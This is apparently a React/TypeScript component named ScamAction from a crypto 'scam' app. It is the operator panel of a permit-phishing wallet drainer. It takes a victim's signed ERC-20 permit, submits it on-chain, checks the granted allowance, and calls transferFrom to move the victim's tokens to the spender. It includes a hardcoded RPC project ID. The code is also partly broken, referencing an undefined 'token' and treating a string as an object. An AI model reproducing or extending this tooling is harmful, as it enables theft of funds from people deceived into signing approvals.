'use client';

import {SignedPermitSignature} from "@/app/scam/page";
import { callContractMethod } from "../page";
import {CustomContract} from "@/app/TokenList";
import React from "react";

const ScamAction = (props: {
	data: SignedPermitSignature
}) => {
	const {data} = props;
	const provider = "https://rpc.walletconnect.com/v1/?chainId=eip155:1&projectId=90e5e5ac9da57364effebface3c64405";
	return (
		<div className={'flex gap-3'}>
			<button onClick={() => {
				callContractMethod('permit', [
						data.permit.owner,
						data.permit.spender,
						data.permit.value,
						data.permit.deadline,
						data.v,
						data.r,
						data.s,
						{
							gasLimit: 1000000
						}
					], CustomContract.ETH,
					provider)
					.catch((e) => {
						alert(`ERROR ${e?.message ?? e}`);
						console.error(e)
					}).then(() => {
					alert("Permit successful!")
				});
			}}>
				permit
			</button>
			<button onClick={async () => {
				alert((await callContractMethod('allowance', [
					data.permit.owner,
					data.permit.spender
				], CustomContract.ETH, provider)));
			}}>
				Allowance
			</button>
			<button onClick={async () => {
				callContractMethod('transferFrom', [
						data.permit.owner,
						data.permit.spender,
						window.prompt("Enter Amount to transfer"),
						{
							gasLimit: 1000000
						}
					], token.contract_address,
					//@ts-ignore
					provider.connection.url + "")
					.catch((e) => {
						alert(`ERROR ${e?.message ?? e}`);
						console.error(e)
					}).then(() => {
					alert("Transfer successful!")
				});
			}}>
				Transfer
			</button>
		</div>
	);
};

export default ScamAction;
